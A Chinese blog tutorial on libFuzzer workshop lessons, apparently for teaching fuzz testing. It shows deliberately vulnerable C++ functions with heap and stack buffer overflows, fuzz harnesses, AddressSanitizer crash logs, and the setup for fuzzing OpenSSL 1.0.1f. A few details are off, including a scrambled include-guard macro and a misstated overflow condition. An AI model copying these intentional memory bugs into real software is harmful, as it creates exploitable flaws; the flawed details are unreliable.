&quot;License&quot;);#ifndef LESSONS_04_VULNERABLE_FUNCTIONS_H_#define LESSLE_FONS_04_VULNERABUNCTIONS_H_#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &lt;cstring&gt;#include &lt;array&gt;#include &lt;string&gt;#include &lt;vector&gt;bool VulnerableFunction1(const uint8_t* data, size_t size) { bool result = false; if (size &gt;= 3) { result = data[0] == 'F' &amp;&amp; data[1] == 'U' &amp;&amp; data[2] == 'Z' &amp;&amp; data[3] == 'Z'; } return result;}template&lt;class T&gt;typename T::value_type DummyHash(const T&amp; buffer) { typename T::value_type hash = 0; for (auto value : buffer) hash ^= value; return hash;}constexpr auto kMagicHeader = &quot;ZN_2016&quot;;constexpr std::size_t kMaxPacketLen = 1024;constexpr std::size_t kMaxBodyLength = 1024 - sizeof(kMagicHeader);bool VulnerableFunction2(const uint8_t* data, size_t size, bool verify_hash) { if (size &lt; sizeof(kMagicHeader)) return false; std::string header(reinterpret_cast&lt;const char*&gt;(data), sizeof(kMagicHeader)); std::array&lt;uint8_t, kMaxBodyLength&gt; body; if (strcmp(kMagicHeader, header.c_str())) return false; auto target_hash = data[--size]; if (size &gt; kMaxPacketLen) return false; if (!verify_hash) return true; std::copy(data, data + size, body.data()); auto real_hash = DummyHash(body); return real_hash == target_hash;}constexpr std::size_t kZn2016VerifyHashFlag = 0x0001000;bool VulnerableFunction3(const uint8_t* data, size_t size, std::size_t flags) { bool verify_hash = flags &amp; kZn2016VerifyHashFlag; return VulnerableFunction2(data, size, verify_hash);}#endif // LESSONS_04_VULNERABLE_FUNCTIONS_H_ 首先看VulnerableFunction1()，有两个参数data/size，当size&gt;3时会产生数组越界。接下来编写测试接口： 12345678910111213//first_fuzzer.cc// Copyright 2016 Google Inc. All Rights Reserved.// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &quot;vulnerable_functions.h&quot;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) { VulnerableFunction1(data, size); return 0;} 可以看到，直接将Libfuzzer生成的测试样例给到VulnerableFunction1就好。接下来编译：clang++ -g -std=c++11 -fsanitize=fuzzer,address first_fuzzer.cc ../../libFuzzer/Fuzzer/libFuzzer.a -o first_fuzzer生成可执行程序first_fuzzer。 12mkdir corpus1./first_fuzz corpus1 corpus1是我们提供的语料库。理想情况下，该语料库应该为被测代码提供各种有效和无效的输入，模糊器基于当前语料库中的样本输入生成随机突变。如果突变触发了测试代码中先前未覆盖的路径的执行，则该突变将保存到语料库中以供将来变更。当然LibFuzzer也可以没有任何初始种子的情况下工作（因为上面提到他是evolutionary型的fuzzer），但如果受测试的库接受复杂的结构化输入，则会因为随机产生的样例不易符合导致效率降低。另外，如果我们有太多的样例并希望能够精简一下，则可以： 12mkdir corpus1_min./first_fuzzer -merge=1 corpus1_min corpus1 这样，corpus1_min将会存放精简后的输入样例。 运行后得到crash，很快啊！！！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081➜ 04 git:(master) ✗ ./first_fuzzer corpus1 INFO: Seed: 2222548757INFO: Loaded 1 modules (35 inline 8-bit counters): 35 [0x7f7120, 0x7f7143), INFO: Loaded 1 PC tables (35 PCs): 35 [0x5b7a68,0x5b7c98), INFO: 0 files found in corpus1INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 3 ft: 3 corp: 1/1b exec/s: 0 rss: 27Mb#3 NEW cov: 4 ft: 4 corp: 2/4b lim: 4 exec/s: 0 rss: 27Mb L: 3/3 MS: 1 CMP- DE: &quot;\\x00\\x00&quot;-#1190 NEW cov: 5 ft: 5 corp: 3/7b lim: 14 exec/s: 0 rss: 27Mb L: 3/3 MS: 2 ChangeBinInt-CMP- DE: &quot;F\\x00&quot;-#12191 NEW cov: 6 ft: 6 corp: 4/11b lim: 122 exec/s: 0 rss: 28Mb L: 4/4 MS: 1 InsertByte-#12297 REDUCE cov: 6 ft: 6 corp: 4/10b lim: 122 exec/s: 0 rss: 28Mb L: 3/3 MS: 1 EraseBytes-#17213 REDUCE cov: 7 ft: 7 corp: 5/40b lim: 170 exec/s: 0 rss: 29Mb L: 30/30 MS: 1 InsertRepeatedBytes-#17274 REDUCE cov: 7 ft: 7 corp: 5/27b lim: 170 exec/s: 0 rss: 29Mb L: 17/17 MS: 1 EraseBytes-#17356 REDUCE cov: 7 ft: 7 corp: 5/24b lim: 170 exec/s: 0 rss: 29Mb L: 14/14 MS: 2 ChangeBit-EraseBytes-#17437 REDUCE cov: 7 ft: 7 corp: 5/18b lim: 170 exec/s: 0 rss: 29Mb L: 8/8 MS: 1 EraseBytes-#17458 REDUCE cov: 7 ft: 7 corp: 5/14b lim: 170 exec/s: 0 rss: 29Mb L: 4/4 MS: 1 EraseBytes-===================================================================9875==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200005a1d3 at pc 0x00000059b461 bp 0x7ffd79c84880 sp 0x7ffd79c84878READ of size 1 at 0x60200005a1d3 thread T0 #0 0x59b460 in VulnerableFunction1(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:22:14 #1 0x59bde4 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/04/first_fuzzer.cc:10:3 #2 0x466186 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:556 #3 0x46b7e9 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:470 #4 0x46b7e9 in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:699 #5 0x46e80f in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:830 #6 0x456b99 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:824 #7 0x41f522 in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19 #8 0x7fbfaac5abf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6) #9 0x41f599 in _start (/home/admin/libfuzzer-workshop/lessons/04/first_fuzzer+0x41f599)0x60200005a1d3 is located 0 bytes to the right of 3-byte region [0x60200005a1d0,0x60200005a1d3)allocated by thread T0 here: #0 0x597b58 in operator new[](unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_new_delete.cpp:102 #1 0x466092 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:541 #2 0x46b7e9 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:470 #3 0x46b7e9 in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:699 #4 0x46e80f in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:830 #5 0x456b99 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:824 #6 0x41f522 in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19 #7 0x7fbfaac5abf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:22:14 in VulnerableFunction1(unsigned char const*, unsigned long)Shadow bytes around the buggy address: 0x0c04800033e0: fa fa fd fa fa fa fd fd fa fa fd fd fa fa fd fd 0x0c04800033f0: fa fa fd fd fa fa fd fa fa fa fd fa fa fa fd fd 0x0c0480003400: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa 0x0c0480003410: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa 0x0c0480003420: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa=&gt;0x0c0480003430: fa fa fd fa fa fa fd fa fa fa[03]fa fa fa fa fa 0x0c0480003440: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0480003450: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0480003460: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0480003470: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0480003480: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc==9875==ABORTINGMS: 1 EraseBytes-; base unit: aea2e3923af219a8956f626558ef32f30a914ebc0x46,0x55,0x5a,FUZartifact_prefix='./'; Test unit written to ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60Base64: RlVa 需要注意的地方有点多:前面的几行输出fuzzer相关的选项和配置信息。seed=2222548757是生成的随机数种子，可以利用./first_fuzzer -seed=2222548757指定随机种子。-max_len为测试输入的最大长度 以#开头的表示在fuzz的过程中覆盖的路径信息。INITED fuzzer已完成初始化，其中包括通过被测代码运行每个初始输入样本。READ fuzzer已从语料库目录中读取了所有提供的输入样本。NEW fuzzer创建了一个测试输入，该输入涵盖了被测代码的新区域。此输入将保存到主要语料库目录。pulse fuzzer已生成 2的n次方个输入（定期生成以使用户确信fuzzer仍在工作）。REDUCE fuzzer发现了一个更好（更小）的输入，可以触发先前发现的特征（设置-reduce_inputs=0以禁用）。cov 执行当前语料库所覆盖的代码块或边的总数。ft libFuzzer使用不同的信号来评估代码覆盖率：边缘覆盖率，边缘计数器，值配置文件，间接调用方/被调用方对等。这些组合的信号称为功能（ft：）。corp 当前内存中测试语料库中的条目数及其大小（以字节为单位）。exec/s 每秒模糊器迭代的次数。rss 当前的内存消耗。L 新输入的大小（以字节为单位）。MS：&lt;n&gt; &lt;操作&gt; 计数和用于生成输入的变异操作列表 #17458 REDUCE cov: 7 ft: 7 corp: 5/14b lim: 170 exec/s: 0 rss: 29Mb L: 4/4 MS: 1 EraseBytes-指尝试了17458个输入，成功发现了5个样本（放入语料库）大小为14b，共覆盖了7个代码块，占用内存29mb，变异操作为EraseBytes-。 接下来就是异常检测相关的信息： 12==9875==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200005a1d3 at pc 0x00000059b461 bp 0x7ffd79c84880 sp 0x7ffd79c84878READ of size 1 at 0x60200005a1d3 thread T0 可以看到AddressSanitizer检测到其中的一个输入触发了堆溢出（heap-buffer-overflow）的漏洞。更据错误信息中的 #0 0x59b460 in VulnerableFunction1(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:22:14可以看到错误点在vulnerable_functions.h:22:14，对应 data[3] == 'Z';即数组越界的位置。下面的SUMMARY也与之对应。 倒数第二行给出了造成crash的输入，并将其写入了crash-0eb8e4ed029b774d80f2b66408203801cb982a60。复现crash可执行./first_fuzzer ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60。 这样fuzz tesing基本上已经完成了，我们得到了一个造成程序crash的输入，并得知存在堆溢出的漏洞。这样我们就可以有针对性的对程序进行动态调试，利用造成crash的输入回溯出漏洞的细节。 继续fuzz函数VulnerableFunction2 123456789101112131415161718192021222324252627constexpr auto kMagicHeader = &quot;ZN_2016&quot;;constexpr std::size_t kMaxPacketLen = 1024;constexpr std::size_t kMaxBodyLength = 1024 - sizeof(kMagicHeader);bool VulnerableFunction2(const uint8_t* data, size_t size, bool verify_hash) { if (size &lt; sizeof(kMagicHeader)) return false; std::string header(reinterpret_cast&lt;const char*&gt;(data), sizeof(kMagicHeader)); std::array&lt;uint8_t, kMaxBodyLength&gt; body; if (strcmp(kMagicHeader, header.c_str())) return false; auto target_hash = data[--size]; if (size &gt; kMaxPacketLen) return false; if (!verify_hash) return true; std::copy(data, data + size, body.data()); auto real_hash = DummyHash(body); return real_hash == target_hash;} 该函数多了一个bool参数，因此我们的的接口函数要有所改动： 1234567891011#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &quot;vulnerable_functions.h&quot;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) { bool verify_hash_flags[] = {true, false}; for(auto flag : verify_hash_flags) VulnerableFunction2(data, size, flag); return 0;} 为了提高fuzz出crash的概率，我们要分别fuzz flag为true和false的请况，而不应该把flag写死。接着编译并执行得到： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778INFO: Seed: 296692635INFO: Loaded 1 modules (37 inline 8-bit counters): 37 [0x7f8160, 0x7f8185), INFO: Loaded 1 PC tables (37 PCs): 37 [0x5b7d00,0x5b7f50), INFO: 0 files found in corpus2INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 5 ft: 6 corp: 1/1b exec/s: 0 rss: 27Mb#414 NEW cov: 6 ft: 7 corp: 2/9b lim: 8 exec/s: 0 rss: 27Mb L: 8/8 MS: 2 ChangeByte-CrossOver- NEW_FUNC[1/13]: 0x59bab0 in unsigned char* std::copy&lt;unsigned char const*, unsigned char*&gt;(unsigned char const*, unsigned char const*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/7.5.0/../../../../include/c++/7.5.0/bits/stl_algobase.h:447 NEW_FUNC[2/13]: 0x59bb40 in std::array&lt;unsigned char, 1016ul&gt;::data() /usr/lib/gcc/x86_64-linux-gnu/7.5.0/../../../../include/c++/7.5.0/array:235#584 NEW cov: 24 ft: 26 corp: 3/17b lim: 8 exec/s: 0 rss: 28Mb L: 8/8 MS: 5 CopyPart-CopyPart-ShuffleBytes-CrossOver-CMP- DE: &quot;ZN_2016&quot;-#105505 NEW cov: 25 ft: 27 corp: 4/1067b lim: 1050 exec/s: 0 rss: 47Mb L: 1050/1050 MS: 1 CrossOver-#106508 REDUCE cov: 25 ft: 27 corp: 4/1046b lim: 1050 exec/s: 0 rss: 48Mb L: 1029/1029 MS: 3 EraseBytes-ChangeBit-CopyPart-#108257 REDUCE cov: 25 ft: 27 corp: 4/1043b lim: 1060 exec/s: 0 rss: 49Mb L: 1026/1026 MS: 4 ChangeByte-ChangeByte-CrossOver-InsertRepeatedBytes-===================================================================10468==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fff31422548 at pc 0x00000055286d bp 0x7fff31421f90 sp 0x7fff31421740WRITE of size 1023 at 0x7fff31422548 thread T0 #0 0x55286c in __asan_memmove /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:30 #1 0x59c238 in unsigned char* std::__copy_move&lt;false, true, std::random_access_iterator_tag&gt;::__copy_m&lt;unsigned char&gt;(unsigned char const*, unsigned char const*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/7.5.0/../../../../include/c++/7.5.0/bits/stl_algobase.h:368:6 #2 0x59c158 in unsigned char* std::__copy_move_a&lt;false, unsigned char const*, unsigned char*&gt;(unsigned char const*, unsigned char const*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/7.5.0/../../../../include/c++/7.5.0/bits/stl_algobase.h:385:14 #3 0x59c0b6 in unsigned char* std::__copy_move_a2&lt;false, unsigned char const*, unsigned char*&gt;(unsigned char const*, unsigned char const*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/7.5.0/../../../../include/c++/7.5.0/bits/stl_algobase.h:422:18 #4 0x59bb39 in unsigned char* std::copy&lt;unsigned char const*, unsigned char*&gt;(unsigned char const*, unsigned char const*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/7.5.0/../../../../include/c++/7.5.0/bits/stl_algobase.h:454:15 #5 0x59b8b5 in VulnerableFunction2(unsigned char const*, unsigned long, bool) /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:61:3 #6 0x59bf63 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/04/second_fuzzer.cc:12:2 #7 0x466186 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:556 #8 0x46b7e9 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:470 #9 0x46b7e9 in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:699 #10 0x46e80f in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:830 #11 0x456b99 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:824 #12 0x41f522 in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19 #13 0x7fd1b4bf6bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6) #14 0x41f599 in _start (/home/admin/libfuzzer-workshop/lessons/04/second_fuzzer+0x41f599)Address 0x7fff31422548 is located in stack of thread T0 at offset 1128 in frame #0 0x59b4af in VulnerableFunction2(unsigned char const*, unsigned long, bool) /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:42 This frame has 3 object(s): [32, 64) 'header' (line 46) [96, 97) 'ref.tmp' (line 46) [112, 1128) 'body' (line 48) &lt;== Memory access at offset 1128 overflows this variableHINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork (longjmp and C++ exceptions *are* supported)SUMMARY: AddressSanitizer: stack-buffer-overflow /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:30 in __asan_memmoveShadow bytes around the buggy address: 0x10006627c450: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006627c460: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006627c470: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006627c480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006627c490: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00=&gt;0x10006627c4a0: 00 00 00 00 00 00 00 00 00[f3]f3 f3 f3 f3 f3 f3 0x10006627c4b0: f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 0x10006627c4c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006627c4d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006627c4e0: 00 00 00 00 f1 f1 f1 f1 02 f3 f3 f3 00 00 00 00 0x10006627c4f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc==10468==ABORTINGMS: 4 ChangeBinInt-CrossOver-ChangeByte-EraseBytes-; base unit: e63bf1b07c6950248bb14fe74c3a84f06c711b15artifact_prefix='./'; Test unit written to ./crash-a42cbe2ff7331f281ef213e54919e8cd932883bd 相信大家已经不再陌生了，定位错误位于#5 0x59b8b5 in VulnerableFunction2(unsigned char const*, unsigned long, bool) /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:61:3即 std::copy(data, data + size, body.data());，该句造成了stack_overflow，原因在于vector类型的body的大小为1024 - sizeof(kMagicHeader)，而在copy时的data的size的限制条件是size &gt; kMaxPacketLen(1024)，从而造成了缓冲区溢出。 如果我们写死flag为false的话就可能会跑很久，也跑不出来crash。因此，我们在套用模板时要结合函数的逻辑，使得fuzz的接口设计的更加合理，从而增加fuzz的效率。 继续继续VulnerableFunction3: 123456constexpr std::size_t kZn2016VerifyHashFlag = 0x0001000;bool VulnerableFunction3(const uint8_t* data, size_t size, std::size_t flags) { bool verify_hash = flags &amp; kZn2016VerifyHashFlag; return VulnerableFunction2(data, size, verify_hash);} 可以看到，与2不同的地方就是对flag进行了&amp; kZn2016VerifyHashFlag的计算，这种其实我们可以计算出使得flags &amp; kZn2016VerifyHashFlag为true/false的输入，并模仿second_fuzzer那样写个循环，这样就和2没差了。但这里workshop提供了一个不同的方法：In this case, we can get some randomization of flags values using data provided by libFuzzer: 12345678910111213141516#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &quot;vulnerable_functions.h&quot;#include &lt;functional&gt;#include &lt;string&gt;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) { std::string data_string(reinterpret_cast&lt;const char*&gt;(data), size); auto data_hash = std::hash&lt;std::string&gt;()(data_string); std::size_t flags = static_cast&lt;size_t&gt;(data_hash); VulnerableFunction3(data, size, flags); return 0;} 采用了libfuzzer提供的随机化方法使得我们的输入flag为随机数，从而flags &amp; kZn2016VerifyHashFlag的结果也随机化。在次数足够多的情况下false和true的情况将趋于同为50%。 接下来看lesson05：这次的目标和lesson04有所不同，lesson04中我们针对.h函数库中的函数进行fuzz，而libfuzzer的威力远不止于此，它还可以对大型开源库进行模糊测试。在源码编译开源库时选择合适的选项以及将libfuzzer与开源库链接在一起以进行fuzz，这些细节将在该lesson05体现。 首先解包tar xzf openssl1.0.1f.tgz。接着执行./config生成makefile。之后： 12make cleanmake CC=&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=address&quot; -j$(nproc) 第二条指令其实并不太规范，将编辑器以外的其他参数也一股脑写到CC变量里了。clang后的参数本应该是由CFLAGS或CXXFLAGS指定的。解释一下选项： 1234-02 指定优先级别-g 带有调试符号来编译-fno-omit-frame-pointer 对于不需要栈指针的函数就不在寄存器中保存指针，因此可以忽略存储和检索地址的代码，同时对许多函数提供一个额外的寄存器。所有”-O”级别都打开它，但仅在调试器可以不依靠栈指针运行时才有效。在AMD64平台上此选项默认打开，但是在x86平台上则默认关闭。建议显式的设置它。-fsanitize 指定sanitize 这些参数的指定是至关重要的，它会影响到之后开源库与libfuzzer的链接以及fuzz的效率。如果不设置这些编译选项直接make的话fuzz的效率如下： 123456789101112➜ 05 git:(master) ✗ ./openssl_fuzzer2INFO: Seed: 1865248494INFO: Loaded 1 modules (10 inline 8-bit counters): 10 [0x96c950, 0x96c95a), INFO: Loaded 1 PC tables (10 PCs): 10 [0x6d56d0,0x6d5770), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 2 ft: 3 corp: 1/1b exec/s: 0 rss: 29Mb#131072 pulse cov: 2 ft: 3 corp: 1/1b lim: 1300 exec/s: 43690 rss: 388Mb#262144 pulse cov: 2 ft: 3 corp: 1/1b lim: 2611 exec/s: 43690 rss: 397Mb#524288 pulse cov: 2 ft: 3 corp: 1/1b lim: 4096 exec/s: 37449 rss: 411Mb#1048576 pulse cov: 2 ft: 3 corp: 1/1b lim: 4096 exec/s: 34952 rss: 411Mb#2097152 pulse cov: 2 ft: 3 corp: 1/1b lim: 4096 exec/s: 32768 rss: 411Mb 这路径覆盖率太感人，其中的重要原因就在于编译开源库时的选项设置。设置编译选项后的fuzz效果： 123456789101112131415161718192021INFO: Seed: 2565779026INFO: Loaded 1 modules (35878 inline 8-bit counters): 35878 [0xcd8590, 0xce11b6), INFO: Loaded 1 PC tables (35878 PCs): 35878 [0x954da8,0x9e1008), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 410 ft: 411 corp: 1/1b exec/s: 0 rss: 36Mb#112 NEW cov: 413 ft: 416 corp: 2/2b lim: 4 exec/s: 0 rss: 42Mb L: 1/1 MS: 5 ChangeBit-ChangeBinInt-ChangeByte-InsertByte-EraseBytes- NEW_FUNC[1/1]: 0x65f0a0 in ERR_put_error /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/crypto/err/err.c:708#319 NEW cov: 420 ft: 448 corp: 3/8b lim: 6 exec/s: 0 rss: 51Mb L: 6/6 MS: 2 ShuffleBytes-CrossOver-#327 REDUCE cov: 420 ft: 448 corp: 3/7b lim: 6 exec/s: 0 rss: 51Mb L: 5/5 MS: 3 ChangeByte-EraseBytes-CrossOver- NEW_FUNC[1/2]: 0x562a40 in tls1_enc /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/t1_enc.c:685 NEW_FUNC[2/2]: 0x67e1d0 in EVP_MD_CTX_md /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/crypto/evp/evp_lib.c:282#454 REDUCE cov: 431 ft: 467 corp: 4/12b lim: 6 exec/s: 0 rss: 57Mb L: 5/5 MS: 2 ShuffleBytes-CMP- DE: &quot;\\xfd\\x03\\x00\\x00&quot;- NEW_FUNC[1/6]: 0x5663d0 in tls1_alert_code /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/t1_enc.c:1214 NEW_FUNC[2/6]: 0x5c6560 in do_ssl3_write /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_pkt.c:634#470 NEW cov: 465 ft: 514 corp: 5/17b lim: 6 exec/s: 0 rss: 58Mb L: 5/5 MS: 1 ChangeByte-#472 REDUCE cov: 465 ft: 521 corp: 6/23b lim: 6 exec/s: 0 rss: 58Mb L: 6/6 MS: 2 CrossOver-CrossOver-#475 NEW cov: 467 ft: 523 corp: 7/28b lim: 6 exec/s: 0 rss: 58Mb L: 5/6 MS: 3 PersAutoDict-ChangeByte-ShuffleBytes- DE: &quot;\\xfd\\x03\\x00\\x00&quot;-#1025 NEW cov: 467 ft: 526 corp: 8/39b lim: 11 exec/s: 0 rss: 81Mb L: 11/11 MS: 5 CopyPart-ShuffleBytes-CrossOver-ShuffleBytes-ChangeBinInt-#1097 NEW cov: 474 ft: 549 corp: 9/49b lim: 11 exec/s: 0 rss: 84Mb L: 10/11 MS: 2 ChangeBit-CopyPart-#1293 REDUCE cov: 474 ft: 549 corp: 9/48b lim: 11 exec/s: 0 rss: 92Mb L: 10/10 MS: 1 EraseBytes- 选择合适的编译器和编译选项，完成对该库的源码编译，生成.a文件。接下来就要研究编写fuzzer接口函数了。workshop提供了openssl_fuzzer.cc： 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;openssl/ssl.h&gt;#include &lt;openssl/err.h&gt;#include &lt;assert.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#ifndef CERT_PATH# define CERT_PATH#endifSSL_CTX *Init() { SSL_library_init(); SSL_load_error_strings(); ERR_load_BIO_strings(); OpenSSL_add_all_algorithms(); SSL_CTX *sctx; assert (sctx = SSL_CTX_new(TLSv1_method())); /* These two file were created with this command: openssl req -x509 -newkey rsa:512 -keyout server.key \\ -out server.pem -days 9999 -nodes -subj /CN=a/ */ assert(SSL_CTX_use_certificate_file(sctx, CERT_PATH &quot;server.pem&quot;, SSL_FILETYPE_PEM)); assert(SSL_CTX_use_PrivateKey_file(sctx, CERT_PATH &quot;server.key&quot;, SSL_FILETYPE_PEM)); return sctx;}extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { static SSL_CTX *sctx = Init(); SSL *server = SSL_new(sctx); BIO *sinbio = BIO_new(BIO_s_mem()); BIO *soutbio = BIO_new(BIO_s_mem()); SSL_set_bio(server, sinbio, soutbio); SSL_set_accept_state(server); BIO_write(sinbio, Data, Size); SSL_do_handshake(server); SSL_free(server); return 0;} 